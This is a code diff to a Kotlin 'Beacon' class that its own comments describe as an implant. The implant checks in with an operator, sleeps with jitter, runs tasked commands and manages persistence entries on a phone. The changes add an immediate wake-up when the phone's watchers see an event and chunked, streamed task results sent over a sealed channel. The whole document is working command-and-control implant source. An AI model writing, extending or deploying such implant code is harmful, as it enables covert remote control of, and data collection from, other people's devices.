@@ -92,6 +92,10 @@ class Beacon(
             thread = null
             channel?.close()
         }
+        // The loop may be asleep: the signal ends the wait at once.
+        synchronized(signal) {
+            signal.notifyAll()
+        }
         if (t != null && t !== Thread.currentThread()) {
             try {
                 t.join(STOP_JOIN_MILLIS)
@@ -102,6 +106,52 @@ class Beacon(
     }
 
     fun isRunning(): Boolean = running.get()
+
+    /**
+     * The signal that asks the loop to connect again right now.
+     *
+     * The watchers of the phone use it: a message that arrives at three
+     * in the morning does not wait for the end of the sleep.
+     */
+    private val signal = Object()
+
+    /** Whether somebody asked for an early connect. */
+    private var wakeRequested = false
+
+    /**
+     * Connect again as soon as possible.
+     *
+     * The call is safe from any thread: the loop wakes up, does a cycle
+     * and goes back to sleep.
+     */
+    fun wake() {
+        synchronized(signal) {
+            wakeRequested = true
+            signal.notifyAll()
+        }
+    }
+
+    /**
+     * Wait for the interval, or until somebody asks for an early connect.
+     *
+     * The wait is on a monitor and not on a sleep, so the request of the
+     * watcher ends it at once.
+     */
+    private fun nap(intervalSeconds: Long) {
+        val until = System.currentTimeMillis() + intervalSeconds * 1000
+        synchronized(signal) {
+            while (!wakeRequested && running.get()) {
+                val left = until - System.currentTimeMillis()
+                if (left <= 0) break
+                try {
+                    signal.wait(left)
+                } catch (_: InterruptedException) {
+                    return
+                }
+            }
+            wakeRequested = false
+        }
+    }
 
     private fun log(msg: String) {
         listener?.onLog(msg)
@@ -133,7 +183,7 @@ class Beacon(
                     sleep = sleep.coerceIn(1, 86400)
                     val interval = nextIntervalSeconds()
                     log("beacon sleeping ${interval}s")
-                    Thread.sleep(interval * 1000)
+                    nap(interval)
                 }
             } catch (e: InterruptedException) {
                 break
@@ -473,7 +523,7 @@ class Beacon(
                         .with("persist", Upk.Arr(emptyList()))
                         .with("persist_total", Upk.num(0))
                         .with("persist_broken", Upk.num(0))
-                    ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, outcome.toValue(id)))
+                    answer(ch, sess, id, outcome)
                     bye()
                     // The exit is the last word of the operator: the
                     // implant takes its persistence entries with it, so the
@@ -486,16 +536,31 @@ class Beacon(
                 "sleep" -> {
                     args.field("sleep")?.long()?.let { sleep = it.coerceIn(1, 86400) }
                     args.field("jitter")?.long()?.let { jitter = it.toInt().coerceIn(0, 90) }
-                    ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, TaskRunner.run("sleep", args).toValue(id)))
+                    answer(ch, sess, id, TaskRunner.run("sleep", args))
                 }
                 else -> {
-                    ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, TaskRunner.run(kind, args).toValue(id)))
+                    answer(ch, sess, id, TaskRunner.run(kind, args))
                 }
             }
         }
         bye()
         failures = 0
         return true
+    }
+
+    /**
+     * The answer of a task.
+     *
+     * A streamed answer travels in pieces: every chunk is a partial
+     * result -- the task stays open while the pieces travel -- and the
+     * final result closes it.  The answer of a task that does not stream
+     * is a single frame, exactly as before.
+     */
+    private fun answer(ch: Channel, sess: Session, id: String, outcome: TaskRunner.Outcome) {
+        for (chunk in outcome.chunks) {
+            ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, outcome.partialValue(id, chunk)))
+        }
+        ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, outcome.toValue(id)))
     }
 
     private fun bye() {
